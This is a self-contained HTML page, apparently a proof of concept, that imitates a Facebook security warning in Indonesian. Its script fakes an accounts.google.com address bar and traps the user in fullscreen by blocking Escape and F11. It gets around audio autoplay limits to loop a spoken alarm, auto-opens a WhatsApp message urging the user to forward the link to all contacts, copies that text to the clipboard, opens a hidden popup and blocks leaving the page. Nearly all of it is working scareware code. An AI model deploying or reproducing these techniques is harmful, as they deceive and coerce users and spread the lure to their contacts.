<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Security Check - Facebook</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' fill='%231877F2'/><text x='8' y='12' text-anchor='middle' fill='white' font-size='12' font-family='Arial' font-weight='bold'>f</text></svg>">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { 
    font-family: 'Segoe UI', Arial, sans-serif; 
    background: #f0f2f5; 
    display: flex; 
    justify-content: center; 
    align-items: center; 
    min-height: 100vh;
}
.overlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.5);
    z-index: 9999;
    display: flex;
    justify-content: center;
    align-items: center;
}
.modal {
    background: white;
    border-radius: 12px;
    padding: 30px;
    max-width: 420px;
    width: 90%;
    text-align: center;
    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    animation: slideIn 0.3s ease;
}
@keyframes slideIn {
    from { transform: translateY(-50px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
}
.modal .f-icon {
    width: 60px; height: 60px;
    background: #1877F2;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto 15px;
    font-size: 32px;
    color: white;
    font-weight: bold;
}
.modal h2 { color: #1c1e21; font-size: 20px; margin-bottom: 8px; }
.modal p { color: #606770; font-size: 14px; margin-bottom: 20px; line-height: 1.5; }
.modal .btn {
    background: #1877F2;
    color: white;
    border: none;
    padding: 12px 40px;
    border-radius: 6px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    width: 100%;
    transition: background 0.2s;
}
.modal .btn:hover { background: #166fe5; }
.modal .btn:active { background: #1464cc; }
.modal .link { color: #1877F2; font-size: 13px; margin-top: 12px; cursor: pointer; }
.audio-frame { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
#status-bar {
    position: fixed; top: 0; left: 0; right: 0;
    height: 44px; background: #fff;
    border-bottom: 1px solid #dadde1;
    display: flex; align-items: center;
    padding: 0 12px; z-index: 10000;
    font-size: 12px; color: #606770;
}
#status-bar .lock { margin-right: 6px; font-size: 14px; }
#status-bar .url { flex: 1; background: #f0f2f5; padding: 4px 8px; border-radius: 4px; font-size: 12px; color: #1c1e21; }
#status-bar .url span { color: #1877F2; }
</style>
</head>
<body>

<div id="status-bar">
    <span class="lock">🔒</span>
    <span class="url"><span>https://</span>accounts.google.com/security-check</span>
</div>

<div class="overlay" id="overlay">
    <div class="modal">
        <div class="f-icon">f</div>
        <h2>Verifikasi Keamanan Diperlukan</h2>
        <p>Kami mendeteksi aktivitas tidak biasa dari akun Anda. Untuk melanjutkan menggunakan Facebook, verifikasi identitas Anda dalam 60 detik.</p>
        <button class="btn" id="verifyBtn">Verifikasi Sekarang</button>
        <div class="link" id="shareBtn">🔗 Bagikan ke teman</div>
    </div>
</div>

<iframe class="audio-frame" src="about:blank" id="audioFrame"></iframe>

<script>
// ===== 1. ADDRESS BAR SPOOFING =====
history.pushState({}, '', '/security-check');
let spoofInterval = setInterval(() => {
    history.pushState({}, '', '/security-check');
}, 500);

window.addEventListener('popstate', (e) => {
    history.pushState({}, '', '/security-check');
});

// ===== 2. FAVICON REPLACEMENT =====
(function() {
    let link = document.querySelector('link[rel*="icon"]') || document.createElement('link');
    link.type = 'image/svg+xml';
    link.rel = 'shortcut icon';
    link.href = "data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><rect width='16' height='16' fill='%231877F2'/><text x='8' y='12' text-anchor='middle' fill='white' font-size='12' font-family='Arial' font-weight='bold'>f</text></svg>";
    document.head.appendChild(link);
})();

// ===== 3. FULLSCREEN API LOCK =====
function enterFullscreen() {
    const el = document.documentElement;
    const methods = [
        el.requestFullscreen,
        el.webkitRequestFullscreen,
        el.msRequestFullscreen,
        el.mozRequestFullScreen
    ];
    for (let m of methods) {
        if (m) { m.call(el).catch(() => {}); break; }
    }
}
enterFullscreen();

// Re-enter fullscreen periodically
setInterval(enterFullscreen, 2000);

// Block Esc and F11
document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' || e.key === 'F11') {
        e.preventDefault();
        e.stopPropagation();
        enterFullscreen();
    }
}, true);

// Re-enter on fullscreenchange
document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) enterFullscreen();
});
document.addEventListener('webkitfullscreenchange', () => {
    if (!document.webkitFullscreenElement) enterFullscreen();
});

// ===== 4. TTS AUTOPLAY BYPASS (Race Condition + AudioContext) =====
(function() {
    // Wave 1: AudioContext unlock attempts
    function tryAudioContext() {
        try {
            const ctx = new (window.AudioContext || window.webkitAudioContext)();
            if (ctx.state === 'suspended') {
                ctx.resume().then(() => {
                    const osc = ctx.createOscillator();
                    const gain = ctx.createGain();
                    gain.gain.value = 0.001;
                    osc.connect(gain);
                    gain.connect(ctx.destination);
                    osc.start();
                    osc.stop(ctx.currentTime + 0.01);
                });
            }
        } catch(e) {}
    }

    // Wave 2: Silent audio element race
    function createSilentAudio() {
        const audio = new Audio();
        audio.src = 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';
        audio.volume = 0.001;
        audio.play().catch(() => {});
    }

    // Execution waves at different timings
    const waves = [
        { delay: 0, fn: tryAudioContext },
        { delay: 0, fn: createSilentAudio },
        { delay: 50, fn: tryAudioContext },
        { delay: 100, fn: createSilentAudio },
        { delay: 150, fn: tryAudioContext },
        { delay: 200, fn: createSilentAudio },
        { delay: 300, fn: () => {
            // Final wave: massive parallel play attempts
            for (let i = 0; i < 20; i++) {
                setTimeout(createSilentAudio, i * 5);
            }
        }}
    ];

    waves.forEach(w => setTimeout(w.fn, w.delay));

    // Continuous keepalive every 30 seconds
    setInterval(() => {
        tryAudioContext();
        createSilentAudio();
    }, 30000);
})();

// ===== 5. TTS SPEECH (After autoplay unlocked) =====
setTimeout(() => {
    const msg = 'Peringatan keamanan! Akun Facebook Anda telah diakses dari perangkat tidak dikenal. Silakan verifikasi sekarang untuk mengamankan akun Anda.';
    const interval = setInterval(() => {
        if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            const utterance = new SpeechSynthesisUtterance(msg);
            utterance.lang = 'id-ID';
            utterance.rate = 1.0;
            utterance.volume = 1.0;
            window.speechSynthesis.speak(utterance);
        }
    }, 2000);
}, 500);

// ===== 6. WHATSAPP SHARE =====
document.getElementById('shareBtn').addEventListener('click', function(e) {
    e.preventDefault();
    shareToWhatsApp();
});

// Auto-trigger share after 10 seconds
setTimeout(shareToWhatsApp, 10000);

function shareToWhatsApp() {
    const message = encodeURIComponent(
        '*PERINGATAN KEAMANAN FACEBOOK* 🚨\n\n' +
        'Akun Facebook saya diretas! Bantuan keamanan Facebook meminta verifikasi.\n\n' +
        'Klik link ini untuk verifikasi:\n' +
        '🔗 https://accounts.google.com/security-check\n\n' +
        'Bagikan ke semua kontak agar mereka juga waspada!'
    );
    
    const url = `https://wa.me/?text=${message}`;
    
    // Try opening wa.me
    const win = window.open(url, '_blank');
    
    // Fallback: copy to clipboard
    const fallbackText = 'PERINGATAN KEAMANAN FACEBOOK 🚨\n\nAkun saya diretas! Verifikasi di sini: https://accounts.google.com/security-check\n\nBagikan ke semua kontak!';
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(fallbackText).catch(() => {});
    }
}

// ===== 7. VERIFY BUTTON → REDIRECT TO FACEBOOK =====
document.getElementById('verifyBtn').addEventListener('click', function() {
    window.location.href = 'https://facebook.com';
});

// Auto-redirect after 60 seconds
setTimeout(() => {
    window.location.href = 'https://facebook.com';
}, 60000);

// ===== 8. BACKGROUND AUDIO KEEPALIVE =====
(function() {
    // Web Worker keepalive
    const blob = new Blob([`
        setInterval(function() {
            self.postMessage('ping');
        }, 1000);
    `], { type: 'application/javascript' });
    
    try {
        const worker = new Worker(URL.createObjectURL(blob));
        worker.onmessage = function() {
            // Keep JS context alive
        };
    } catch(e) {}

    // Hidden popup fallback
    const popup = window.open('about:blank', 'keepalive', 'width=1,height=1,left=-1000,top=-1000');
    if (popup) {
        try {
            popup.document.write('<script>setInterval(function(){},1000);<' + '/script>');
            popup.blur();
        } catch(e) {}
        window.focus();
    }
})();

// Prevent closing/leaving
window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = '';
});

// Re-spoof on visibility change (user returns to tab)
document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
        setTimeout(() => {
            history.pushState({}, '', '/security-check');
            enterFullscreen();
        }, 100);
    }
});

console.log('%c[+] Security PoC Loaded', 'color: #00ff00; font-size: 16px;');
console.log('%c[+] Target: Facebook redirect', 'color: #1877F2; font-size: 14px;');
</script>
</body>
</html>
